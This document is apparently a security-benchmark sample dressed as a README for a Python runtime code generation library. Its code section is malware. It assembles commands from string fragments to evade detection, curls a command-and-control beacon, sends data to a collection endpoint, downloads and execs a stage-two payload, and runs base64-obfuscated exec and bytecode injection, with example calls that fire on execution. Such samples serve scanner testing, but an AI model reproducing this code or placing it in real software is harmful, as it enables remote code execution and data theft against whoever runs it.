# Runtime Code Generation Framework

BENCHMARK_TEST_ONLY - This file contains intentionally malicious patterns for security testing.

## Description

A framework for generating and executing optimized code at runtime using string building and AST manipulation.

## Installation

```bash
pip install runtime-codegen
```

## Usage

Generate optimized code dynamically based on runtime conditions:

```python
# Runtime Code Generation Engine
import ast
import types
import sys

class CodeGenerator:
    """Generate and execute code at runtime."""

    def __init__(self):
        self.generated_code = []
        self.c2_endpoint = "https://[REDACTED].example.com"

    # DYNAMIC-006: Build code from string fragments
    def build_from_parts(self, parts):
        """Construct code from separate string parts."""
        # Assemble code from fragments to avoid detection
        code_string = ''.join(parts)

        # Execute the constructed code
        exec(code_string)
        return code_string

    def generate_payload(self):
        """Generate malicious payload dynamically."""
        # Split dangerous operations into innocuous parts
        p1 = "import "
        p2 = "os; os."
        p3 = "system('"
        p4 = "curl " + self.c2_endpoint
        p5 = "/beacon')"

        # Combine and execute
        payload = p1 + p2 + p3 + p4 + p5
        exec(payload)

    # DYNAMIC-006: AST manipulation for code construction
    def build_via_ast(self, func_name, body_code):
        """Construct function using AST nodes."""
        # Parse body code
        body_ast = ast.parse(body_code).body

        # Create function definition node
        func_def = ast.FunctionDef(
            name=func_name,
            args=ast.arguments(
                posonlyargs=[],
                args=[],
                vararg=None,
                kwonlyargs=[],
                kw_defaults=[],
                kwarg=None,
                defaults=[]
            ),
            body=body_ast,
            decorator_list=[],
            returns=None
        )

        # Create module and compile
        module = ast.Module(body=[func_def], type_ignores=[])
        ast.fix_missing_locations(module)

        code = compile(module, '<ast>', 'exec')

        # Execute to define function
        namespace = {}
        exec(code, namespace)

        return namespace[func_name]

    def generate_exfil_function(self):
        """Generate data exfiltration function via AST."""
        exfil_code = '''
import urllib.request
import json
data = {"secrets": str(dir())}
req = urllib.request.Request(
    "https://[REDACTED].example.com/collect",
    data=json.dumps(data).encode(),
    headers={"Content-Type": "application/json"}
)
urllib.request.urlopen(req)
'''
        return self.build_via_ast('exfiltrate', exfil_code)

    def obfuscated_exec(self, code):
        """Execute code with multiple layers of obfuscation."""
        # Encode the code
        import base64
        encoded = base64.b64encode(code.encode()).decode()

        # Build decoder and executor
        executor = f"exec(__import__('base64').b64decode('{encoded}').decode())"

        # Execute via eval
        eval(compile(executor, '<string>', 'exec'))

    def generate_loader(self):
        """Generate a dynamic code loader."""
        loader_parts = [
            "def load():\n",
            "    import urllib.request\n",
            "    url = '", self.c2_endpoint, "/stage2'\n",
            "    code = urllib.request.urlopen(url).read()\n",
            "    exec(code)\n",
            "load()"
        ]

        return self.build_from_parts(loader_parts)

class BytecodeManipulator:
    """Low-level bytecode manipulation for code generation."""

    def inject_bytecode(self, target_func, injection):
        """Inject code into existing function."""
        # Get function code object
        code = target_func.__code__

        # Create new code object with injected bytecode
        # This is extremely dangerous and allows arbitrary code injection
        new_code = code.replace(
            co_code=injection + code.co_code
        )

        # Replace function's code
        target_func.__code__ = new_code

# Example usage
generator = CodeGenerator()

# Build and execute payload from parts
generator.generate_payload()

# Generate function via AST and call it
exfil = generator.generate_exfil_function()
exfil()

# Obfuscated execution
generator.obfuscated_exec("import os; os.system('whoami')")
```

## Features

- String-based code assembly
- AST-based function generation
- Bytecode-level manipulation
- Multi-layer obfuscation
